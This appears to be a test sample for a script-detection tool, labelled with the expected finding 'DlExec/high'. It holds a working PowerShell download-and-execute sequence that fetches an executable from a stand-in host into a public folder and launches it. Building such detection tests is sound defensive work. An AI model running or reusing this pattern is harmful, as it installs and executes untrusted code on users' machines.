# expect: DlExec/high
# url: http://example.com/x.exe
$wc = New-Object System.Net.WebClient
$wc.DownloadFile('http://example.com/x.exe', 'C:\Users\Public\x.exe')
Start-Process 'C:\Users\Public\x.exe'
